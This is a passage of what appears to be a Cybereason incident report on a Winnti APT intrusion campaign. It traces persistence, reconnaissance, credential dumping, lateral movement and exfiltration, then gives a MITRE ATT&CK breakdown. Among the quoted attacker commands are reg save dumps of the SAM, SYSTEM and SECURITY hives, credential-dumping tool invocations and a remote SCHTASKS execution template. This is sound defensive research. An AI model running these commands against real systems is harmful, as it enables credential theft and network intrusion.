<p style="text-align: center;"><em>cscript //nologo "C:\Windows\System32\winrm.vbs" set winrm/config/service @{EnableCompatibilityHttpsListener="true"}</em></p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image5-Apr-26-2022-06-59-11-65-PM.png?width=805&amp;name=image5-Apr-26-2022-06-59-11-65-PM.png" alt="image5-Apr-26-2022-06-59-11-65-PM" width="805" loading="lazy" style="width: 805px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image5-Apr-26-2022-06-59-11-65-PM.png?width=403&amp;name=image5-Apr-26-2022-06-59-11-65-PM.png 403w, https://www.cybereason.com/hs-fs/hubfs/image5-Apr-26-2022-06-59-11-65-PM.png?width=805&amp;name=image5-Apr-26-2022-06-59-11-65-PM.png 805w, https://www.cybereason.com/hs-fs/hubfs/image5-Apr-26-2022-06-59-11-65-PM.png?width=1208&amp;name=image5-Apr-26-2022-06-59-11-65-PM.png 1208w, https://www.cybereason.com/hs-fs/hubfs/image5-Apr-26-2022-06-59-11-65-PM.png?width=1610&amp;name=image5-Apr-26-2022-06-59-11-65-PM.png 1610w, https://www.cybereason.com/hs-fs/hubfs/image5-Apr-26-2022-06-59-11-65-PM.png?width=2013&amp;name=image5-Apr-26-2022-06-59-11-65-PM.png 2013w, https://www.cybereason.com/hs-fs/hubfs/image5-Apr-26-2022-06-59-11-65-PM.png?width=2415&amp;name=image5-Apr-26-2022-06-59-11-65-PM.png 2415w" sizes="(max-width: 805px) 100vw, 805px"></em><span style="font-size: 16px;"><em>Modifying system WinRM configuration using cscript.exe as seen in the Cybereason XDR Platform</em></span></p>
<h4 style="font-size: 20px; font-weight: normal;"><span style="color: #666666;">Persistence Technique #3: Loading a Signed Kernel Rootkit&nbsp;</span></h4>
<p>The attackers leveraged a <a href="https://attack.mitre.org/techniques/T1547/006/"><span>Signed Kernel Rootkit</span></a> to establish an additional persistence mechanism. Detailed analysis of this stealthy rootkit will be provided in part two of this&nbsp; research in the series, which offers a deep dive into the Winnti malware arsenal.</p>
<h4 style="font-size: 20px; font-weight: normal;"><span style="color: #666666;">Persistence Technique #4: Windows Service&nbsp;</span></h4>
<p>The attackers abused the legitimate IKEEXT and PrintNotify <a href="https://attack.mitre.org/techniques/T1543/003/"><span>Windows Services</span></a> to <a href="https://attack.mitre.org/techniques/T1574/002/"><span>side-load</span></a> Winnti DLLs and preserve persistence. Full analysis will also be provided in part two of the research.</p>
<h3 style="font-size: 24px; font-weight: normal;"><span style="color: #434343;">Reconnaissance</span></h3>
<h4 style="font-size: 20px; font-weight: normal;"><span style="color: #666666;">Initial Reconnaissance</span></h4>
<p>Upon gaining access to the Windows ERP server, Winnti used the following commands:</p>
<ul>
<li><em style="background-color: transparent;">cat /etc/hosts</em></li>
<li aria-level="1"><em>route print</em></li>
</ul>
<p><span style="background-color: transparent; font-weight: 400;">The nature of these commands suggest they may have been part of an automated vulnerability discovery process, as the ERP server is a Windows server and </span><em style="background-color: transparent;">cat /etc/hosts</em><span style="background-color: transparent; font-weight: 400;"> is a Unix command.</span></p>
<p>After these commands were executed, the attackers began a more dedicated reconnaissance activity using built-in Windows commands to gather information on the compromised server, rounding out the initial reconnaissance phase:</p>
<ul>
<li aria-level="1"><em>systeminfo</em></li>
</ul>
<ul>
<li aria-level="1"><em>net start</em></li>
</ul>
<ul>
<li aria-level="1"><em>net user</em></li>
</ul>
<ul>
<li aria-level="1"><em>dir c:\&nbsp;</em></li>
</ul>
<h4 style="font-size: 18px;">&nbsp;</h4>
<h4 style="font-size: 20px; font-weight: normal;"><span style="color: #666666;">Advanced Stages Reconnaissance</span></h4>
<p>After establishing a foothold on multiple machines in the network, Winnti began leveraging <a href="https://attack.mitre.org/techniques/T1053/" rel="noopener" target="_blank"><span>Scheduled Tasks</span></a> to execute batch scripts by the names “<em>cc.bat</em>” or <em>“bc.bat”</em>. The content of these batch files varied from one machine to another, each time containing different reconnaissance commands based on the attackers’ goals. Examples of this type of reconnaissance commands are as follows:&nbsp;</p>
<table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;">
<tbody>
<tr>
<td>
<p><strong><span style="color: #575955;">Command</span></strong></p>
</td>
<td>
<p><strong><span style="color: #575955;">Technique</span></strong></p>
</td>
</tr>
<tr>
<td>
<p><em>fsutil fsinfo drives</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">System Drives Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>ipconfig</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">System Network Configuration Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>nbtstat</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">Remote System Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>net accounts</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">Password Policy Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>net group</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">Permission Groups Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>net session</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">System Network Session Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>net share</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">Network Share Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>net start</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">System Service Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>net time</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">System Time Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>net use</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">System Network Connections Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>net user</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">Account Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>net view</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">Network Share Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>netstat</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">System Network Connections Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>nslookup</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">System DNS Configuration Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>ping</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">Remote System Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>query user</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">System Owner/User Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>systeminfo</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">System Information Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>tasklist</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">Process Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>tracert</em></p>
</td>
<td>
<p style="font-size: 18px;"><span style="color: #575955;">Remote System Route Discovery</span></p>
</td>
</tr>
<tr>
<td>
<p><em>whoami</em></p>
</td>
<td>
<p><span style="font-size: 18px; color: #575955;">Logged On User Discovery</span></p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>When the attackers gained access to a desired domain environment, they started gathering information about the domain using built-in Windows commands again. In this phase, Cybereason Nocturnus IR team observed additional queries for users in administrative groups along with execution of <a href="https://attack.mitre.org/software/S0105/"><span>Dsquery</span></a> and <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc755162(v=ws.11)https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc755162(v=ws.11)"><span>Dsget</span></a> commands. The attackers then compressed using <a href="https://attack.mitre.org/techniques/T1560/001/" rel="noopener" target="_blank"><span>makecab.exe</span></a> the collected information and exfiltrated it to their servers.</p>
<h3 style="font-size: 24px; font-weight: normal;"><span style="color: #434343;">Credential Dumping</span></h3>
<p style="text-align: justify;">During the attack, Cybereason Nocturnus observed two methods that were utilized for credential dumping: the first one used the known <a href="https://attack.mitre.org/techniques/T1003/002/" rel="noopener" target="_blank"><span>reg save</span></a> command, and the second was an unknown tool, named <em>MFSDLL.exe</em>.</p>
<p>Using the reg save command, the attackers attempted to dump the SYSTEM, SAM and SECURITY registry hives as follows:</p>
<ul>
<li aria-level="1"><em>reg save HKLM\SYSTEM system.hiv</em></li>
</ul>
<ul>
<li aria-level="1"><em>reg save HKLM\SAM sam.hiv</em></li>
</ul>
<ul>
<li aria-level="1"><em>reg save HKLM\SECURITY security.hiv</em></li>
</ul>
<p>Dumping these hives ultimately enabled the attackers to crack password hashes locally.&nbsp;</p>
<p>The second tool used by the attackers to dump credentials was a previously undocumented executable named <em>MFSDLL.exe</em>. At the time of the investigation, Cybereason was not able to recover a copy of it to examine its content. Nevertheless, the Cybereason XDR solution managed to detect how this file was used as well as what it loaded. The attackers used this tool in the following manner:</p>
<p style="text-align: center;"><em>MFSDLL.exe &lt;12 characters string&gt; &lt;file&gt; &lt;parameter&gt; (f</em>or example - <em>MSFDLL.exe</em> <em>&lt;12 characters string&gt; 1.log dump</em>)</p>
<p style="text-align: justify;">The variations it was found to be used were:</p>
<ul>
<li aria-level="1"><em>MFSDLL.exe &lt;12 characters string&gt; &lt;file_name&gt;.log domain</em></li>
</ul>
<ul>
<li aria-level="1"><em>MFSDLL.exe &lt;12 characters string&gt; &lt;file_name&gt;.log dump</em></li>
</ul>
<ul>
<li aria-level="1"><em>MFSDLL.exe &lt;12 characters string&gt; &lt;file_name&gt;.log password</em></li>
</ul>
<ul>
<li aria-level="1"><em>MFSDLL.exe &lt;12 characters string&gt; &lt;file_name&gt;.log sam</em></li>
</ul>
<ul>
<li aria-level="1"><em>MFSDLL.exe &lt;12 characters string&gt; &lt;file_name&gt;.log minidump</em></li>
</ul>
<p>The Nocturnus IR team also observed the loading of a DLL file called <em>mktzx64.dll</em> along with the <em>sam</em> command execution. The name of this DLL was mentioned in a <a href="https://www.welivesecurity.com/2020/05/14/mikroceen-spying-backdoor-high-profile-networks-central-asia/" rel="noopener" target="_blank"><span>report by ESET</span></a> detailing an espionage campaign in Asia linked to China, and it suggests the use of <a href="https://attack.mitre.org/software/S0002/" rel="noopener" target="_blank"><span>Mimikatz</span></a>, a popular credential dumping tool.</p>
<p>This manner of execution resembles ACEHASH, a credential theft and password dumping utility, which was leveraged by the Winnti group in the <a href="https://www.mandiant.com/resources/game-over-detecting-and-stopping-an-apt41-operation" rel="noopener" target="_blank"><span>past</span></a>, using commands such as “<em>c64.exe f64.data "9839D7F1A0 -m”</em>:</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/image1-Apr-26-2022-07-01-24-88-PM.png?width=872&amp;name=image1-Apr-26-2022-07-01-24-88-PM.png" alt="image1-Apr-26-2022-07-01-24-88-PM" width="872" loading="lazy" style="width: 872px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image1-Apr-26-2022-07-01-24-88-PM.png?width=436&amp;name=image1-Apr-26-2022-07-01-24-88-PM.png 436w, https://www.cybereason.com/hs-fs/hubfs/image1-Apr-26-2022-07-01-24-88-PM.png?width=872&amp;name=image1-Apr-26-2022-07-01-24-88-PM.png 872w, https://www.cybereason.com/hs-fs/hubfs/image1-Apr-26-2022-07-01-24-88-PM.png?width=1308&amp;name=image1-Apr-26-2022-07-01-24-88-PM.png 1308w, https://www.cybereason.com/hs-fs/hubfs/image1-Apr-26-2022-07-01-24-88-PM.png?width=1744&amp;name=image1-Apr-26-2022-07-01-24-88-PM.png 1744w, https://www.cybereason.com/hs-fs/hubfs/image1-Apr-26-2022-07-01-24-88-PM.png?width=2180&amp;name=image1-Apr-26-2022-07-01-24-88-PM.png 2180w, https://www.cybereason.com/hs-fs/hubfs/image1-Apr-26-2022-07-01-24-88-PM.png?width=2616&amp;name=image1-Apr-26-2022-07-01-24-88-PM.png 2616w" sizes="(max-width: 872px) 100vw, 872px"><span style="font-size: 16px;"><em>MFSDLL.exe executions as seen in the Cybereason XDR Platform</em></span></p>
<h3 style="font-weight: normal; font-size: 24px;"><span style="color: #434343;">Lateral Movement</span></h3>
<p>For lateral movement, the attackers used the Windows-native <a href="https://docs.microsoft.com/en-us/windows/win32/taskschd/schtasks" rel="noopener" target="_blank"><em><span>Schtasks</span></em> </a>command to create remote scheduled tasks, and to execute malicious code through the aforementioned batch files:&nbsp;</p>
<table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;">
<tbody>
<tr>
<td style="border: 1pt solid #000000;">
<p style="text-align: center;"><em>SCHTASKS /Create /S &lt;IP Address&gt; /U &lt;Username&gt; /p &lt;Password&gt; /SC ONCE /TN test /TR &lt;Path to a Batch File&gt; /ST &lt;Time&gt; /RU SYSTEM</em></p>
</td>
</tr>
</tbody>
</table>
<p style="font-size: 16px; text-align: center;"><em>The scheduled task command line used for lateral movement</em></p>
<p>The scheduled tasks the attackers have created were created with the name <em>test</em>, using compromised Domain Administrator credentials. The batch file the scheduled task executed was executed from a temp folder using the local SYSTEM account.</p>
<p>The attackers used these scheduled tasks to execute commands on dozens of compromised machines throughout this stage of the attack. The batch files’ content have changed from one phase of the attack to another, which were initially used to execute reconnaissance commands and later on were used in order to distribute malicious binaries.&nbsp;</p>
<p>Among the compromised machines, the attackers were able to expand their control to the Domain Controllers using the same method. Once the Domain Admin credentials were obtained, the attackers were able to move laterally and infect a large number of hosts using the stolen credentials.&nbsp;</p>
<h3 style="font-size: 24px; font-weight: normal;"><span style="color: #434343;">Data Collection and Exfiltration</span></h3>
<p>To collect data efficiently, the attackers have utilized a renamed Chinese-language version of <a href="https://www.win-rar.com/start.html?&amp;L=0" rel="noopener" target="_blank"><span>WinRAR</span></a> to create password-protected archives containing the stolen data. The WinRAR executable is a 32-bit command-line version of the legitimate WinRAR application. The executable was renamed to <em>rundll32.exe</em>, a legitimate Windows program, in order to disguise it and silently blend it in with other Windows system files:</p>
<p style="text-align: center; font-size: 18px;"><img src="https://www.cybereason.com/hs-fs/hubfs/image6-Apr-26-2022-07-02-27-16-PM.png?width=628&amp;name=image6-Apr-26-2022-07-02-27-16-PM.png" alt="image6-Apr-26-2022-07-02-27-16-PM" width="628" loading="lazy" style="width: 628px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image6-Apr-26-2022-07-02-27-16-PM.png?width=314&amp;name=image6-Apr-26-2022-07-02-27-16-PM.png 314w, https://www.cybereason.com/hs-fs/hubfs/image6-Apr-26-2022-07-02-27-16-PM.png?width=628&amp;name=image6-Apr-26-2022-07-02-27-16-PM.png 628w, https://www.cybereason.com/hs-fs/hubfs/image6-Apr-26-2022-07-02-27-16-PM.png?width=942&amp;name=image6-Apr-26-2022-07-02-27-16-PM.png 942w, https://www.cybereason.com/hs-fs/hubfs/image6-Apr-26-2022-07-02-27-16-PM.png?width=1256&amp;name=image6-Apr-26-2022-07-02-27-16-PM.png 1256w, https://www.cybereason.com/hs-fs/hubfs/image6-Apr-26-2022-07-02-27-16-PM.png?width=1570&amp;name=image6-Apr-26-2022-07-02-27-16-PM.png 1570w, https://www.cybereason.com/hs-fs/hubfs/image6-Apr-26-2022-07-02-27-16-PM.png?width=1884&amp;name=image6-Apr-26-2022-07-02-27-16-PM.png 1884w" sizes="(max-width: 628px) 100vw, 628px"><span style="font-size: 16px;"><em>The WinRAR renamed version</em></span></p>
<h2 style="font-size: 30px;">Conclusions</h2>
<p>In the first part of this Winnti research, we reported the discovery of multiple sets of intrusions that went undetected for years. These intrusions targeted technology and manufacturing companies in multiple regions of the world to steal sensitive information for cyber espionage purposes.&nbsp;</p>
<p>Based on our analysis and the information available, we assess with moderate-to-high confidence that the attacks described in this report were carried out by the notorious Winnti APT Group, a highly sophisticated APT group operating on behalf of Chinese state interests that has been active since at least 2010. The group has been known over the years for its focus on intellectual property theft.&nbsp;</p>
<p>In this part of the research, we offered readers a unique glimpse into the attacker’s playbook, forensically tracing the attack steps from initial compromise all the way through data exfiltration. In <a href="/blog/operation-cuckoobees-a-winnti-malware-arsenal-deep-dive" rel="noopener" target="_blank">part two of this research</a>, we will take a deep dive into the Winnti malware arsenal, analyzing the different implants and unique infection chains.&nbsp;</p>
<h2 style="font-size: 30px;">Acknowledgments</h2>
<p>This research has not been possible without the tireless effort, analysis, attention to details and contribution of the Cybereason Incident Response team. Special thanks and appreciation goes to Matt Hart, Yusuke Shimizu, Niamh O’Connor, Jim Hung, and Omer Yampel.&nbsp;</p>
<h2 style="font-size: 30px;">Indicators of Compromise</h2>
<p><em>LOOKING FOR THE IOCs? CLICK ON THE CHATBOT DISPLAYED IN LOWER-RIGHT OF YOUR SCREEN FOR ACCESS. Due to the sensitive nature of the attack, not all IOCs observed by Cybereason can be shared in our public report. </em><a href="/company/contact-us" rel="noopener" target="_blank"><em><span>Please contact us for more information</span></em></a><em>.</em></p>
<h2 style="font-size: 30px;">MITRE ATT&amp;CK BREAKDOWN</h2>
<table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2; width: 841px; height: 1279.67px;">
<tbody>
<tr style="height: 77.3333px;">
<td style="border: 1pt solid #000000; width: 149px; height: 77px; vertical-align: middle; background-color: #cccccc;">
<p><span style="font-size: 16px;"><strong><span style="color: #000000;">Reconnaissance</span></strong></span></p>
</td>
<td style="border: 1pt solid #000000; width: 142px; height: 77px; vertical-align: middle; background-color: #cccccc;">
<p><span style="font-size: 16px;"><strong><span style="color: #000000;">Initial Access</span></strong></span></p>
</td>
<td style="border: 1pt solid #000000; width: 143px; height: 77px; vertical-align: middle; background-color: #cccccc;">
<p><span style="font-size: 16px;"><strong><span style="color: #000000;">Execution</span></strong></span></p>
</td>
<td style="border: 1pt solid #000000; width: 146px; height: 77px; vertical-align: middle; background-color: #cccccc;">
<p><span style="font-size: 16px;"><strong><span style="color: #000000;">Persistence</span></strong></span></p>
</td>
<td style="border: 1pt solid #000000; width: 132px; height: 77px; vertical-align: middle; background-color: #cccccc;">
<p><span style="font-size: 16px;"><strong><span style="color: #000000;">Privilege Escalation</span></strong></span></p>
</td>
<td style="border: 1pt solid #000000; width: 129px; height: 77px; vertical-align: middle; background-color: #cccccc;">
<p><span style="font-size: 16px;"><strong><span style="color: #000000;">Defense Evasion</span></strong></span></p>
</td>
</tr>
<tr style="height: 175px;">
<td style="border: 1pt solid #000000; width: 149px; height: 175px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1589/001/">Gather Victim Identity Information: Credentials</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 142px; height: 175px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1190/">Exploit Public-Facing Application</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 143px; height: 175px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1053/">Scheduled Task/Job</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 146px; height: 175px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1505/003/">Server Software Component: Web Shell</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 132px; height: 175px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1543/003/">Create or Modify System Process: Windows Service</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 129px; height: 175px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1574/002/">Hijack Execution Flow: DLL Side-Loading</a></span></p>
</td>
</tr>
<tr style="height: 113px;">
<td style="border: 1pt solid #000000; width: 149px; height: 113px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1590/">Gather Victim Network Information</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 142px; height: 113px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1195/">Supply Chain Compromise</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 143px; height: 113px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1559/">Inter-process communication</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 146px; height: 113px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1574/002/">Hijack Execution Flow: DLL Side-Loading</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 132px; height: 113px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 129px; height: 113px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1014/">Rootkit</a></span></p>
</td>
</tr>
<tr style="height: 174px;">
<td style="border: 1pt solid #000000; width: 149px; height: 174px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 142px; height: 174px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 143px; height: 174px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1203/">Exploitation for Client Execution</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 146px; height: 174px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1055/001/">Process Injection: Dynamic-link Library Injection</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 132px; height: 174px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1055/001/">Process Injection: Dynamic-link Library Injection</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 129px; height: 174px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1036/005/">Masquerading: Match Legitimate Name or Location</a></span></p>
</td>
</tr>
<tr style="height: 175px;">
<td style="border: 1pt solid #000000; width: 149px; height: 175px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 142px; height: 175px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 143px; height: 175px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1059/003/">Command and Scripting Interpreter: Windows Command Shell</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 146px; height: 175px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1053/005/">Scheduled Task/Job: Scheduled Task</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 132px; height: 175px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1053/005/">Scheduled Task/Job: Scheduled Task</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 129px; height: 175px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1055/001/">Process Injection: Dynamic-link Library Injection</a></span></p>
</td>
</tr>
<tr style="height: 139px;">
<td style="border: 1pt solid #000000; width: 149px; height: 139px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 142px; height: 139px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 143px; height: 139px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1059/005/">Command and Scripting Interpreter: Visual Basic</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 146px; height: 139px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1078/002/">Valid Accounts: Domain Accounts</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 132px; height: 139px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1078/002/">Valid Accounts: Domain Accounts</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 129px; height: 139px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1620/">Reflective Code Loading</a></span></p>
</td>
</tr>
<tr style="height: 145px;">
<td style="border: 1pt solid #000000; width: 149px; height: 145px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 142px; height: 145px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 143px; height: 145px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1106/">Native API</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 146px; height: 145px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1078/003/">Valid Accounts: Local Accounts</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 132px; height: 145px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1078/003/">Valid Accounts: Local Accounts</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 129px; height: 145px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1218/011/">Signed Binary Proxy Execution: Rundll32</a></span></p>
</td>
</tr>
<tr style="height: 173px;">
<td style="border: 1pt solid #000000; width: 149px; height: 173px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 142px; height: 173px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 143px; height: 173px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 146px; height: 173px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1547/006/">Boot or Logon Autostart Execution: Kernel Modules and Extensions</a></span></p>
</td>
<td style="border: 1pt solid #000000; width: 132px; height: 173px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 129px; height: 173px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1078/002/">Valid Accounts: Domain Accounts</a></span></p>
</td>
</tr>
<tr style="height: 107px;">
<td style="border: 1pt solid #000000; width: 149px; height: 107px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 142px; height: 107px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 143px; height: 107px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 146px; height: 107px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 132px; height: 107px;">&nbsp;</td>
<td style="border: 1pt solid #000000; width: 129px; height: 107px;">
<p style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1078/003/"><span>Valid Accounts: Local Accounts</span></a></p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2; height: 1154px;">
<tbody>
<tr style="height: 80px;">
<td style="border: 1pt solid #000000; height: 80px; width: 121.021px; background-color: #cccccc; vertical-align: middle;">
<p><span style="font-size: 16px;"><strong><span style="color: #000000;">Credential Access</span></strong></span></p>
</td>
<td style="border: 1pt solid #000000; height: 80px; width: 157.5px; background-color: #cccccc; vertical-align: middle;">
<p><span style="font-size: 16px;"><strong><span style="color: #000000;">Discovery</span></strong></span></p>
</td>
<td style="border: 1pt solid #000000; height: 80px; width: 151.333px; background-color: #cccccc; vertical-align: middle;">
<p><span style="font-size: 16px;"><strong><span style="color: #000000;">Lateral movement</span></strong></span></p>
</td>
<td style="border: 1pt solid #000000; height: 80px; width: 144.479px; background-color: #cccccc; vertical-align: middle;">
<p><span style="font-size: 16px;"><strong><span style="color: #000000;">Collection</span></strong></span></p>
</td>
<td style="border: 1pt solid #000000; height: 80px; width: 124.646px; background-color: #cccccc; vertical-align: middle;">
<p><span style="font-size: 16px;"><strong><span style="color: #000000;">Exfiltration</span></strong></span></p>
</td>
<td style="border: 1pt solid #000000; height: 80px; width: 146px; background-color: #cccccc; vertical-align: middle;">
<p><span style="font-size: 16px;"><strong><span style="color: #000000;">Command and Control</span></strong></span></p>
</td>
</tr>
<tr style="height: 133.333px;">
<td style="border: 1pt solid #000000; height: 133px; width: 121.021px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1003/">OS Credential Dumping</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 133px; width: 157.5px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1016/">System Network Configuration Discovery</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 133px; width: 151.333px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1210/">Exploitation of Remote Services</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 133px; width: 144.479px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1560/001/">Archive Collected Data: Archive via Utility</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 133px; width: 124.646px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1020/">Automated Exfiltration</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 133px; width: 146px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1071/001/">Application Layer Protocol: Web Protocols</a></span></p>
</td>
</tr>
<tr style="height: 109.333px;">
<td style="border: 1pt solid #000000; height: 109px; width: 121.021px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 109px; width: 157.5px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1018/">Remote System Discovery</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 109px; width: 151.333px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1021/001/">Remote Services: Remote Desktop Protocol</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 109px; width: 144.479px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1119/">Automated Collection</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 109px; width: 124.646px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 109px; width: 146px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1090/">Proxy</a></span></p>
</td>
</tr>
<tr style="height: 80px;">
